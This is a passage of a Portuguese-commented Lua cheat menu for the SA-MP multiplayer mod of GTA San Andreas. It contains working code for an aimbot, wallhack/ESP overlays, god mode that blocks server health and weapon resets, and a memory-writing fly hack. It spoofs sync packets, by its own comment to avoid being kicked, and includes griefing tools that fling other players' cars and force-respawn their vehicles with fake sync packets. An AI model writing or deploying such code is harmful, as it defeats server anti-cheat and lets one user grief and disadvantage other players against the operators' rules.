    if copy_from_player and sync_info[3] then
        local _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        sync_info[3](player_id, raw_data_ptr)
    end

    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end

    local mt = {
        __index = function(t, index) return data[index] end,
        __newindex = function(t, index, value) data[index] = value end
    }

    return setmetatable({send = func_send}, mt)
end

-- Detecta plataforma com base em sync
function events.onUnoccupiedSync(id, data)
    players[id] = "PC"
end

function events.onPlayerSync(id, data)
    if data.keysData == 160 then
        players[id] = "PC"
    end

    if data.specialAction ~= 0 and data.specialAction ~= 1 then
        players[id] = "PC"
    end

    if data.leftRightKeys and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        players[id] = "Mobile"
    elseif players[id] ~= "Mobile" then
        players[id] = "PC"
    end

    if data.upDownKeys and data.upDownKeys ~= 128 and data.upDownKeys ~= 65408 then
        players[id] = "Mobile"
    elseif players[id] ~= "Mobile" then
        players[id] = "PC"
    end
end

function events.onVehicleSync(id, vehid, data)
    if data.leftRightKeys and data.leftRightKeys ~= 0 and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        players[id] = "Mobile"
    end
end

function events.onPlayerQuit(id)
    players[id] = nil
end

function sampev.onSendPlayerSync(data)
    if invertPlayer[0] then
        data.quaternion[0] = 0
        data.quaternion[1] = 1
        data.quaternion[2] = 0
        data.quaternion[3] = 0
        data.position.y = data.position.y + 0.2
    end
end

function sampev.onRequestSpawnResponse()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onRequestClassResponse()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onResetPlayerWeapons()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onBulletSync()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onSetPlayerHealth()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onSetCameraBehind()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onSetPlayerSkin()
    if EASY.godmod[0] then
        return false
    end
end

function sampev.onTogglePlayerControllable()
    if EASY.godmod[0] then
        return false
    end
end

-- Mover entidade sem resetar anima��es
function setCharCoordinatesSafe(char, x, y, z)
    local ptr = getCharPointer(char)
    if ptr ~= 0 then
        local matrix = readMemory(ptr + 0x14, 4, false)
        if matrix ~= 0 then
            local pos = matrix + 0x30
            writeMemory(pos + 0, 4, representFloatAsInt(x), false)
            writeMemory(pos + 4, 4, representFloatAsInt(y), false)
            writeMemory(pos + 8, 4, representFloatAsInt(z), false)
        end
    end
end

-- AirBrake com suporte total a carro e ped
function processFlyHack()
    local x1, y1 = getActiveCameraCoordinates()
    local x2, y2 = getActiveCameraPointAt()
    local angle = -math.rad(getHeadingFromVector2d(x2 - x1, y2 - y1))

    local cx, cy, cz = getCharCoordinates(PLAYER_PED)
    local dx, dy, dz = 0, 0, 0
    local spd = speed[0]

    local result, analog_x, analog_y =
        isWidgetPressedEx(isCharInAnyCar(PLAYER_PED) and WIDGET_VEHICLE_STEER_ANALOG or WIDGET_PED_MOVE, 0)
    if result then
        analog_x = analog_x / 127
        analog_y = analog_y / 127
        dx = math.cos(angle) * spd * analog_x - math.sin(angle) * spd * analog_y
        dy = -math.sin(angle) * spd * analog_x - math.cos(angle) * spd * analog_y
    end

    if isWidgetPressed(WIDGET_ZOOM_IN) then
        dz = dz + spd / 2
    end
    if isWidgetPressed(WIDGET_ZOOM_OUT) then
        dz = dz - spd / 2
    end

    local newX = cx + dx
    local newY = cy + dy
    local newZ = cz + dz

    if isCharInAnyCar(PLAYER_PED) then
        local car = storeCarCharIsInNoSave(PLAYER_PED)
        last_car = car
        was_in_car = true

        freezeCarPosition(car, true)
        setCarCollision(car, false)

        local carPtr = getCarPointer(car)
        if carPtr ~= 0 then
            local matrix = readMemory(carPtr + 0x14, 4, false)
            if matrix ~= 0 then
                local pos = matrix + 0x30
                writeMemory(pos + 0, 4, representFloatAsInt(newX), false)
                writeMemory(pos + 4, 4, representFloatAsInt(newY), false)
                writeMemory(pos + 8, 4, representFloatAsInt(newZ), false)
            end
        end

        setCarHeading(car, math.deg(-angle))
    else
        if was_in_car and last_car and doesVehicleExist(last_car) then
            freezeCarPosition(last_car, false)
            setCarCollision(last_car, true)
        end
        was_in_car = false
        freezeCharPosition(PLAYER_PED, true)
        setCharCollision(PLAYER_PED, false)

        setCharCoordinatesSafe(PLAYER_PED, newX, newY, newZ)
        setCharHeading(PLAYER_PED, math.deg(-angle))
    end
end

-- Sync spoof (player)
function sampev.onSendPlayerSync(data)
    if airbrake_enabled[0] then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        data.position = {x, y, z}
        data.moveSpeed.x = 0.0
        data.moveSpeed.y = 0.0
        data.moveSpeed.z = 0.0
        data.specialAction = 0 -- Libera soco/tiro
    end
end

local desativarSync = false

function iniciarLoopPuxador()
    lua_thread.create(function()
        desativarSync = true -- desativa sync para evitar kick
        while loopAtivo do
            local ok, ped = sampGetCharHandleBySampPlayerId(idAlvo)
            if not ok or not doesCharExist(ped) then
                sampAddChatMessage("[PUXAR]: JOGADOR NAO ENCONTRADO", -1)
                loopAtivo = false
                break
            end

            local tx, ty, tz = getCharCoordinates(ped)
            local carroAtual = isCharInAnyCar(PLAYER_PED) and getCarCharIsUsing(PLAYER_PED) or nil

            for _, veiculo in ipairs(getAllVehicles()) do
                if not loopAtivo then break end
                if doesVehicleExist(veiculo) then
                    if carroAtual then removeCharFromCarMaintainPosition(PLAYER_PED, carroAtual) end

                    warpCharIntoCar(PLAYER_PED, veiculo)
                    setCharCoordinates(PLAYER_PED, tx + 2.5, ty, tz + 2.0)
                    wait(100)

                    if isCharInAnyCar(PLAYER_PED) then
                        removeCharFromCarMaintainPosition(PLAYER_PED, veiculo)
                    end

                    setCharCoordinates(PLAYER_PED, tx, ty, tz - 1.0)

                    if carroAtual then warpCharIntoCar(PLAYER_PED, carroAtual) end

                    wait(150)
                end
            end

            wait(1500)
        end
        desativarSync = false -- reativa sync ao finalizar loop
    end)
end

-- Evento para bloquear sync quando bypass ativado
function events.onSendPlayerSync(data)
    if desativarSync then
        return false
    end
end

-- Sync spoof (ve�culo)
function sampev.onSendVehicleSync(data)
    if airbrake_enabled[0] then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        data.position = {x, y, z}
        data.moveSpeed.x = 0.0
        data.moveSpeed.y = 0.0
        data.moveSpeed.z = 0.0
    end
end

function sampev.onSendGiveDamage()
    if hg.ANTIDM[0] then
        return false
    end
end

function executarTroll(id)
    if not id then
        sampAddChatMessage('{FF0000}ID INVALIDO.', -1)
        return
    end

    local encontrado, pedAlvo = sampGetCharHandleBySampPlayerId(id)
    if not encontrado or not doesCharExist(pedAlvo) then
        sampAddChatMessage('{FF0000}JOGADOR NAO ENCONTRADO OU NAO ESTA VISIVEL.', -1)
        return
    end

    local veiculoAlvo = storeCarCharIsInNoSave(pedAlvo)
    local meuVeiculo = storeCarCharIsInNoSave(PLAYER_PED)
    mveh = meuVeiculo

    local ok1 = sampGetVehicleIdByCarHandle(veiculoAlvo)
    local ok2 = sampGetVehicleIdByCarHandle(meuVeiculo)

    if not ok1 then
        sampAddChatMessage('{FFFF00}O JOGADOR NAO ESTA EM UM VEICULO.', -1)
        return
    elseif not ok2 then
        sampAddChatMessage('{FFFF00}VOCE PRECISA ESTAR EM UM VEICULO PARA TROLLAR.', -1)
        return
    end

    lua_thread.create(function()
        warpCharIntoCar(PLAYER_PED, veiculoAlvo)
        printStringNow('~R~TROLLANDO JOGADOR!', 1000)
        wait(500)
        applyForceToCar(veiculoAlvo, 1, 0.0, 1000000.0, 50.0, 20000.0, 0.0, 0.0, true)
        wait(100)
        warpCharIntoCar(PLAYER_PED, mveh)
    end)
end

function sendMessagebypass(message)
    sampAddChatMessage("[{00e1ff}BYPASS ARMAS " .. message, -1)
end

function giveGun(weapon_id, ammo)
    if isCharInAnyCar(PLAYER_PED) then
        sendMessage("Voce nao pode puxar armas dentro de veiculos.")
        return
    end

    local model_id = getWeapontypeModel(weapon_id)
    requestModel(model_id)
    loadAllModelsNow()
    giveWeaponToChar(PLAYER_PED, weapon_id, ammo)
end

function ev.onResetPlayerWeapons()
    if EASY.noreset[0] then    
    return false
    end
end

function matararea()
    areasafe = not areasafe
end 

function autoTPLoop()
    lua_thread.create(function()
        while true do
            wait(0)
            if autoTPCheck[0] and coordenadasValidas() then
                moverComBypass(destino.x, destino.y, destino.z)
                wait(2000) -- espera 2s entre execu��es para evitar spam
            else
                wait(500)
            end
        end
    end)
end

-- Fun��o de movimenta��o com bypass
function moverComBypass(x, y, z)
    local px, py, pz = getCharCoordinates(PLAYER_PED)
    local distancia = math.sqrt((x - px)^2 + (y - py)^2 + (z - pz)^2)
    if distancia > 2000 then
        sampAddChatMessage("[NEXUS] Destino muito distante. (> 2000m)", 0xFF0000)
        return
    end

    local passos = math.floor(distancia / 0.55)
    local isInCar = isCharInAnyCar(PLAYER_PED)

    if isInCar then
        setCarCollision(storeCarCharIsInNoSave(PLAYER_PED), false)
    else
        setCharCollision(PLAYER_PED, false)
    end

    for i = 1, passos do
        if not autoTPCheck[0] then break end
        local t = i / passos
        local nx = px + (x - px) * t
        local ny = py + (y - py) * t
        local nz = pz + (z - pz) * t
        if isInCar then
            setCarCoordinates(storeCarCharIsInNoSave(PLAYER_PED), nx, ny, nz)
        else
            setCharCoordinates(PLAYER_PED, nx, ny, nz)
        end
        wait(29)
    end

    if isInCar then
        local carro = storeCarCharIsInNoSave(PLAYER_PED)
        setCarCoordinates(carro, x, y, z)
        setCarCollision(carro, true)
    else
        setCharCoordinates(PLAYER_PED, x, y, z)
        setCharCollision(PLAYER_PED, true)
    end
end

-- Checar se coordenadas foram recebidas
function coordenadasValidas()
    return destino.x ~= 0 and destino.y ~= 0 and destino.z ~= 0
end

-- Quando servidor envia checkpoint, salva coordenadas
function sampev.onSetCheckpoint(position, radius)
    destino.x = position.x
    destino.y = position.y
    destino.z = position.z
end

function Aimbot()
    function getCameraRotation()
        local horizontalAngle = camera.aCams[0].fHorizontalAngle
        local verticalAngle = camera.aCams[0].fVerticalAngle
        return horizontalAngle, verticalAngle
    end

    function setCameraRotation(EASYaimbotHorizontal, EASYaimbotVertical)
        camera.aCams[0].fHorizontalAngle = EASYaimbotHorizontal
        camera.aCams[0].fVerticalAngle = EASYaimbotVertical
    end

    function convertCartesianCoordinatesToSpherical(EASYaimbot)
        local coordsDifference = EASYaimbot - vector3d(getActiveCameraCoordinates())
        local length = coordsDifference:length()
        local angleX = math.atan2(coordsDifference.y, coordsDifference.x)
        local angleY = math.acos(coordsDifference.z / length)

        if angleX > 0 then
            angleX = angleX - math.pi
        else
            angleX = angleX + math.pi
        end

        local angleZ = math.pi / 2 - angleY
        return angleX, angleZ
    end

    function getCrosshairPositionOnScreen()
        local screenWidth, screenHeight = getScreenResolution()
        local crosshairX = screenWidth * slide.posiX[0]
        local crosshairY = screenHeight * slide.posiY[0]
        return crosshairX, crosshairY
    end

    function getCrosshairRotation(EASYaimbot)
        EASYaimbot = EASYaimbot or 5
        local crosshairX, crosshairY = getCrosshairPositionOnScreen()
        local worldCoords = vector3d(convertScreenCoordsToWorld3D(crosshairX, crosshairY, EASYaimbot))
        return convertCartesianCoordinatesToSpherical(worldCoords)
    end

    function aimAtPointWithM16(EASYaimbot)
        local sphericalX, sphericalY = convertCartesianCoordinatesToSpherical(EASYaimbot)
        local cameraRotationX, cameraRotationY = getCameraRotation()
        local crosshairRotationX, crosshairRotationY = getCrosshairRotation()
        local newRotationX = cameraRotationX + (sphericalX - crosshairRotationX) * slide.aimSmoothhhh[0]
        local newRotationY = cameraRotationY + (sphericalY - crosshairRotationY) * slide.aimSmoothhhh[0]
        setCameraRotation(newRotationX, newRotationY)
    end

    function aimAtPointWithSniperScope(EASYaimbot)
        local sphericalX, sphericalY = convertCartesianCoordinatesToSpherical(EASYaimbot)
        setCameraRotation(sphericalX, sphericalY)
    end

    function getNearCharToCenter(EASYaimbot)
        local nearChars = {}
        local screenWidth, screenHeight = getScreenResolution()

        for _, char in ipairs(getAllChars()) do
            if isCharOnScreen(char) and char ~= PLAYER_PED and not isCharDead(char) then
                local charX, charY, charZ = getCharCoordinates(char)
                local screenX, screenY = convert3DCoordsToScreen(charX, charY, charZ)
                local distance = getDistanceBetweenCoords2d(screenWidth / 1.923 + slide.posiX[0], screenHeight / 2.306 + slide.posiY[0], screenX, screenY)

                if isCurrentCharWeapon(PLAYER_PED, 34) then
                    distance = getDistanceBetweenCoords2d(screenWidth / 2, screenHeight / 2, screenX, screenY)
                end

                if distance <= tonumber(EASYaimbot and EASYaimbot or screenHeight) then
                    table.insert(nearChars, {
                        distance,
                        char
                    })
                end
            end
        end

        if #nearChars > 0 then
            table.sort(nearChars, function(a, b)
                return a[1] < b[1]
            end)
            return nearChars[1][2]
        end

        return nil
    end

    local distancia = slide.DistanciaAIM[0]
    local nMode = camera.aCams[0].nMode
    local nearChar = getNearCharToCenter(slide.fovvaimbotcirculo[0] + 1.923)
    
    if nearChar then
            local boneX, boneY, boneZ = getBonePosition(nearChar, 5)
        if boneX and boneY and boneZ then
            local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
            local distanceToBone = getDistanceBetweenCoords3d(playerX, playerY, playerZ, boneX, boneY, boneZ)
    
            if not sulist.aimbotparede[0] then
                local targetX, targetY, targetZ = boneX, boneY, boneZ
                local hit, colX, colY, colZ, entityHit = processLineOfSight(playerX, playerY, playerZ, targetX, targetY, targetZ, true, true, false, true, false, false, false, false)
                if hit and entityHit ~= nearChar then
                    return
                end
            else
                local targetX, targetY, targetZ = boneX, boneY, boneZ
            end
    
            if distanceToBone < distancia then
                local point
    
                if sulist.cabecaAIM[0] then
                    local headX, headY, headZ = getBonePosition(nearChar, 5)
                    point = vector3d(headX, headY, headZ)
                end
    
                if sulist.peitoAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 3)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.virilhaAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 1)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.lockAIM[0] then
                    local partX, partY, partZ = getBonePosition(nearChar, miraAtual)
                    point = vector3d(partX, partY, partZ)

                    local parts = {}

                    if sulist.cabecaAIM[0] then
                        table.insert(parts, 5)
                    end
                    if sulist.peitoAIM[0] then
                        table.insert(parts, 3)
                    end
                    if sulist.virilhaAIM[0] then
                        table.insert(parts, 1)
                    end
                    if sulist.bracoAIM[0] then
                        table.insert(parts, 33)
                    end
                    if sulist.braco2AIM[0] then
                        table.insert(parts, 23)
                    end
                    if sulist.pernaAIM[0] then
                        table.insert(parts, 52)
                    end
                    if sulist.perna2AIM[0] then
                        table.insert(parts, 42)
                    end

                    if not miraAtualIndex then
                        miraAtualIndex = 1
                    end

                    if #parts > 0 then
                        if isCharShooting(PLAYER_PED) then
                            tiroContador = tiroContador + 1

                            if tiroContador >= slide.aimCtdr[0] then
                                tiroContador = 0
                                miraAtualIndex = (miraAtualIndex % #parts) + 1
                                miraAtual = parts[miraAtualIndex]
                            end
                        end

                        local partX, partY, partZ = getBonePosition(nearChar, miraAtual)
                        point = vector3d(partX, partY, partZ)
                    end
                end
                
                if sulist.bracoAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 33)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.braco2AIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 23)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.pernaAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 52)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.perna2AIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 42)
                    point = vector3d(chestX, chestY, chestZ)
                end
    
                if point then
                    if nMode == 7 then
                        aimAtPointWithSniperScope(point)
                    elseif nMode == 53 then
                        aimAtPointWithM16(point)
                    end
                end
            end
        end
    end
end

function drawCircle(x, y, radius, color)
    local segments = 300 * DPI
    local angleStep = (2 * math.pi) / segments
    local lineWidth = 1.5 * DPI

    for i = 0, segments - 0 do
        local angle1 = i * angleStep
        local angle2 = (i + 1) * angleStep
        
        local x1 = x + (radius - lineWidth / 2) * math.cos(angle1)
        local y1 = y + (radius - lineWidth / 2) * math.sin(angle1)
        local x2 = x + (radius - lineWidth / 2) * math.cos(angle2)
        local y2 = y + (radius - lineWidth / 2) * math.sin(angle2)
        
        renderDrawLine(x1, y1, x2, y2, lineWidth, color)
    end
end

function isPlayerInFOV(playerX, playerY)
    local dx = playerX - slide.fovX[0]
    local dy = playerY - slide.fovY[0]
    local distanceSquared = dx * dx + dy * dy
    return distanceSquared <= slide.FoVVHG[0] * slide.FoVVHG[0]
end

function colorToHex(r, g, b, a)
    return bit.bor(bit.lshift(math.floor(a * 255), 24), bit.lshift(math.floor(r * 255), 16), bit.lshift(math.floor(g * 255), 8), math.floor(b * 255))
end

function getBonePosition(ped, bone)
  local pedptr = ffi.cast('void*', getCharPointer(ped))
  local posn = ffi.new('RwV3d[1]')
  gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
  return posn[0].x, posn[0].y, posn[0].z
end

function fix(angle)
    if angle > math.pi then
        angle = angle - (math.pi * 2)
    elseif angle < -math.pi then
        angle = angle + (math.pi * 2)
    end
    return angle
end

function getDistance(x1, y1, x2, y2)
    return math.sqrt((x2 - x1)^2 + (y2 - y1)^2)
end

function renderESP()
    if not var_0_10 then
        var_0_10 = createFont()
        if not var_0_10 then
            return
        end
    end

    local colorVisible = 0xFFFFFFFF -- Branco vis�vel
    local colorBehindWall = 0xFFFF0000 -- Vermelho caso obstru�do

    if EASY.esp_enabled[0] then
        local px, py, pz = getCharCoordinates(PLAYER_PED)

        for id = 0, 999 do
            local exists, ped = sampGetCharHandleBySampPlayerId(id)

            if exists and doesCharExist(ped) and isCharOnScreen(ped) then
                local tx, ty, tz = getCharCoordinates(ped)
                local distance = math.floor(getDistanceBetweenCoords3d(px, py, pz, tx, ty, tz))

                if distance <= 1000 then
                    local sx1, sy1 = convert3DCoordsToScreen(px, py, pz)
                    local sx2, sy2 = convert3DCoordsToScreen(tx, ty, tz)

                    local color =
                        isLineOfSightClear(px, py, pz, tx, ty, tz, true, true, false, true, true) and colorVisible or
                        colorBehindWall

                    renderDrawLine(sx1, sy1, sx2, sy2, 2, color)

                    local distanceText = string.format("%.1f", distance) .. "m"
                    renderFontDrawText(var_0_10, distanceText, sx2, sy2, color, false)
                end
            end
        end
    end
end

function drawSkeletonESP()
    local playerPed = PLAYER_PED
    local px, py, pz = getCharCoordinates(playerPed)
    local color = 0xFF00FFFF -- ciano claro

    for _, char in ipairs(getAllChars()) do
        if char ~= playerPed then
            local result, id = sampGetPlayerIdByCharHandle(char)
            if result and isCharOnScreen(char) then
                for _, bone in ipairs(bones) do
                    local x1, y1, z1 = getBonePosition(char, bone)
                    local x2, y2, z2 = getBonePosition(char, bone + 1)
                    local r1, sx1, sy1 = convert3DCoordsToScreenEx(x1, y1, z1)
                    local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)
                    if r1 and r2 then
                        renderDrawLine(sx1, sy1, sx2, sy2, 3, color)
                    end
                end
            end
        end
    end
end

function renderWallhack()
    if not var_0_10 then
        var_0_10 = createFont()
        if not var_0_10 then
            return
        end
    end

    if EASY.wallhack_enabled[0] then
        for _, char in ipairs(getAllChars()) do
            if char ~= PLAYER_PED then
                local ok, id = sampGetPlayerIdByCharHandle(char)
                if ok and isCharOnScreen(char) then
                    local x, y, z = getOffsetFromCharInWorldCoords(char, 0, 0, 0)
                    local sx, sy = convert3DCoordsToScreen(x, y, z + 1)
                    local sx2, sy2 = convert3DCoordsToScreen(x, y, z - 1)

                    local nickname = sampGetPlayerNickname(id) .. " (" .. id .. ")"
                    if sampIsPlayerPaused(id) then
                        nickname = "[AFK] " .. nickname
                    end

                    local hp = sampGetPlayerHealth(id)
                    local ap = sampGetPlayerArmor(id)
                    local colorNick = bit.bor(bit.band(sampGetPlayerColor(id), 0xFFFFFF), 0xFF000000)

                    renderFontDrawText(
                        var_0_10,
                        nickname,
                        sx - renderGetFontDrawTextLength(var_0_10, nickname) / 2,
                        sy - renderGetFontDrawHeight(var_0_10) * 3.8,
                        colorNick
                    )
                    renderDrawBoxWithBorder(sx - 24, sy - 45, 50, 6, 0xFF000000, 1, 0xFF000000)
                    renderDrawBoxWithBorder(sx - 24, sy - 45, hp / 2, 6, 0xFFFF0000, 1, 0)

                    if ap > 0 then
                        renderDrawBoxWithBorder(sx - 24, sy - 35, 50, 6, 0xFF000000, 1, 0xFF000000)
                        renderDrawBoxWithBorder(sx - 24, sy - 35, ap / 2, 6, 0xFFFFFFFF, 1, 0)
                    end
                end
            end
        end
    end
end

function espcarlinha()
    local color = 0xFF00FF00 -- verde
    local thickness = 2
    local px, py = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))

    local corners = {
        {x = 1.5, y = 3, z = 1},
        {x = 1.5, y = -3, z = 1},
        {x = -1.5, y = -3, z = 1},
        {x = -1.5, y = 3, z = 1},
        {x = 1.5, y = 3, z = -1},
        {x = 1.5, y = -3, z = -1},
        {x = -1.5, y = -3, z = -1},
        {x = -1.5, y = 3, z = -1}
    }

    for _, veh in ipairs(getAllVehicles()) do
        if isCarOnScreen(veh) then
            local boxCorners = {}
            for _, offset in ipairs(corners) do
                local wx, wy, wz = getOffsetFromCarInWorldCoords(veh, offset.x, offset.y, offset.z)
                local sx, sy = convert3DCoordsToScreen(wx, wy, wz)
                table.insert(boxCorners, {x = sx, y = sy})
            end

            for i = 1, 4 do
                local ni = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[ni].x, boxCorners[ni].y, thickness, color)
                renderDrawLine(
                    boxCorners[i].x,
                    boxCorners[i].y,
                    boxCorners[i + 4].x,
                    boxCorners[i + 4].y,
                    thickness,
                    color
                )
            end

            for i = 5, 8 do
                local ni = (i % 4 == 0 and i - 3) or (i + 1)
                renderDrawLine(boxCorners[i].x, boxCorners[i].y, boxCorners[ni].x, boxCorners[ni].y, thickness, color)
            end
        end
    end
end

function esplinhacarro()
    local color = 0xFF00FF00 -- verde
    local x, y = convert3DCoordsToScreen(getCharCoordinates(PLAYER_PED))

    for _, veh in ipairs(getAllVehicles()) do
        if isCarOnScreen(veh) then
            local carX, carY, carZ = getCarCoordinates(veh)
            local sx, sy = convert3DCoordsToScreen(carX, carY, carZ)
            renderDrawLine(x, y, sx, sy, 2, color)
        end
    end
end

function espinfo()
    local color = 0xFF00FF00 -- verde

    for _, v in ipairs(getAllVehicles()) do
        if v and isCarOnScreen(v) then
            local x, y, z = getCarCoordinates(v)
            local model = getCarModel(v)
            local _, id = sampGetVehicleIdByCarHandle(v)
            local hp = getCarHealth(v)
            local speed = getCarSpeed(v)

            local sx, sy = convert3DCoordsToScreen(x, y, z + 1)
            local info = string.format("CARRO: %d (ID: %d)\nLATARIA: %d\nVELOCIDADE: %.2f", model, id, hp, speed)
            renderFontDrawText(font, info, sx, sy, color)
        end
    end
end

function events.onSendPlayerSync(data)
    if disablePlayerSync then return false end
end

function sendFakeVehicleSync(vehId)
	local px, py, pz = getCharCoordinates(PLAYER_PED)
	local data = allocateMemory(59)

	setStructElement(data, 0, 2, vehId, false)
	setStructElement(data, 2, 2, 0, false)
	setStructElement(data, 4, 2, 0, false)
	setStructElement(data, 6, 2, 0, false)
	setStructFloatElement(data, 8, 0, false)
	setStructFloatElement(data, 12, 0, false)
	setStructFloatElement(data, 16, 0, false)
	setStructFloatElement(data, 20, 0, false)
	setStructFloatElement(data, 24, px, false)
	setStructFloatElement(data, 28, py, false)
	setStructFloatElement(data, 32, pz, false)
	setStructFloatElement(data, 36, 0, false)
	setStructFloatElement(data, 40, 0, false)
	setStructFloatElement(data, 44, 0, false)
	setStructFloatElement(data, 48, 0, false)
	setStructElement(data, 52, 1, 100, false)
	setStructElement(data, 53, 1, 0, false)
	setStructElement(data, 54, 1, 0, false)
	setStructElement(data, 55, 1, 0, false)
	setStructElement(data, 56, 1, 0, false)
	setStructElement(data, 57, 2, 0, false)

	sampSendIncarData(data)
	freeMemory(data)
	sampSendVehicleDestroyed(vehId)
end

function getClosestPlayerInOpenCar()
	local allChars = getAllChars()
	local minDist = 9999
	local closestPlayerPed = -1
	for _, ped in ipairs(allChars) do
		if isCharInAnyCar(ped) then
			local dist = getDistanceFromPed(ped)
			local car = storeCarCharIsInNoSave(ped)
			local model = getCarModel(car)
			if (getCarDoorLockStatus(car) == 0 or model == 552 or model == 510) and dist < minDist and model ~= 437 then
				minDist = dist
				closestPlayerPed = ped
			end
		end
	end
	local F, id = sampGetPlayerIdByCharHandle(closestPlayerPed)
	if F then return id else return -1 end
end

function getDistanceFromPed(ped)
	local X, Y, Z = getCharCoordinates(PLAYER_PED)
	local Xi, Yi, Zi = getCharCoordinates(ped)
	return math.sqrt( (Xi - X) ^ 2 + (Yi - Y) ^ 2 + (Zi - Z) ^ 2 )
end

function getDistance(x1, y1, x2, y2)
    return math.sqrt((x2 - x1) ^ 2 + (y2 - y1) ^ 2)
end

function teleportPlayer(playerId)
    local success, ped = sampGetCharHandleBySampPlayerId(playerId)
    if success then
        local pX, pY, pZ = getCharCoordinates(ped)
        local playerPed = PLAYER_PED
        local px, py, pz = getCharCoordinates(playerPed)

        local distanceThreshold = 999
        local distance = getDistance(px, py, pX, pY)

        if distance <= distanceThreshold then
            local offsetX = 1
            local offsetY = 1
            local heading = getCharHeading(ped)
            local radian = math.rad(heading)
            local newX = pX + math.sin(radian) * offsetX
            local newY = pY - math.cos(radian) * offsetY
            local newZ = pZ
            setCharCoordinates(playerPed, newX, newY, newZ)
            sampAddChatMessage("{6ff700} TELEPORTADO PARA JOGADOR COM ID" .. playerId, -1)
        else
            sampAddChatMessage("{f7f700} JOGADOR DISTANTE", -1)
        end
    else
        sampAddChatMessage("PLAYER NAO ENCONTRADO", -1)
    end
end

function respawnCarById(id)
    if isCharInAnyCar(PLAYER_PED) then
        return sampAddChatMessage(" Voc� est� dentro de um ve�culo.", 0xFF6666)
    end
    if disablePlayerSync then
        return sampAddChatMessage(" A sincroniza��o do jogador est� desativada.", 0xFF6666)
    end

    -- Verifica se foi passado ID manual ou usa o mais pr�ximo
    if id == nil or id == "" then
        id = getClosestPlayerInOpenCar()
    else
        id = tonumber(id)
        if not id or not sampIsPlayerConnected(id) then
            return sampAddChatMessage(" ID INV�LIDO OU JOGADOR DESCONECTADO.", 0xFF6666)
        end
    end

    local streamedIn, ped = sampGetCharHandleBySampPlayerId(id)
    if not streamedIn then
        return sampAddChatMessage(" JOGADOR N�O EST� PR�XIMO.", 0xFF6666)
    end

    if not isCharInAnyCar(ped) then
        return sampAddChatMessage(" JOGADOR N�O EST� EM UM VE�CULO.", 0xFF6666)
    end

    local car = storeCarCharIsInNoSave(ped)
    local model = getCarModel(car)
    if getCarDoorLockStatus(car) ~= 0 and model ~= 552 and model ~= 510 then
        return sampAddChatMessage(" VE�CULO TRANCADO. NAO PODE SER REAPARECIDO.", 0xFF6666)
    end

    sampAddChatMessage(" REAPARECENDO VEICULO...", 0x00CCFF)
    disablePlayerSync = true

    local _, veh = sampGetVehicleIdByCarHandle(car)
    local name = sampGetPlayerNickname(id)
    local distance = math.floor(getDistanceFromPed(ped))

    lua_thread.create(function()
        for i = 1, 30 do
            sendFakeVehicleSync(veh)
            wait(35)
        end
        disablePlayerSync = false
        sampAddChatMessage(
            string.format(" VEICULO REAPARECIDO: {FFFF00}%s {00CCFF}ID {FFFF00}%d {00CCFF}| DIST�NCIA: {FFFF00}%dm",
            name, id, distance), 0x00CCFF)
    end)
end

function getBonePosition(ped, bone)
    local pedptr = ffi.cast("void*", getCharPointer(ped))
    local posn = ffi.new("RwV3d[1]")
    gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
    return posn[0].x, posn[0].y, posn[0].z
end

function main()
    sampRegisterChatCommand("menu", function()
        window[0] = not window[0]
    end)

    while true do
        wait(0)
        lua_thread.create(Aimbot)

        -- ESP geral
        if EASY.esp_enabled[0] then renderESP() end
        if EASY.ESP_ESQUELETO[0] then drawSkeletonESP() end
        if EASY.wallhack_enabled[0] then renderWallhack() end
        if EASY.espcar_enabled[0] then esplinhacarro() end
        if EASY.espcarlinha_enablade[0] then espcarlinha() end
        if EASY.espinfo_enabled[0] then espinfo() end
        if EASY.espplataforma[0] then espplataforma() end

        -- Anti DM (vazio por enquanto)
        if hg.ANTIDM[0] then
            -- c�digo futuro
        end

        -- Soco r�pido
        if fastPunch[0] then applyFastPunch() end

        -- No reload
        if EASY.noreload[0] then
            local weap = getCurrentCharWeapon(PLAYER_PED)
            local nbs = raknetNewBitStream()
            raknetBitStreamWriteInt32(nbs, weap)
            raknetBitStreamWriteInt32(nbs, 0)
            raknetEmulRpcReceiveBitStream(22, nbs)
            raknetDeleteBitStream(nbs)
        end

        -- Fast reload
        if EASY.fastreload[0] then
            setPlayerFastReload(PLAYER_HANDLE, true)
            local reloadAnims = {
                "TEC_RELOAD", "buddy_reload", "buddy_crouchreload",
                "colt45_reload", "colt45_crouchreload", "sawnoff_reload",
                "python_reload", "python_crouchreload", "RIFLE_load",
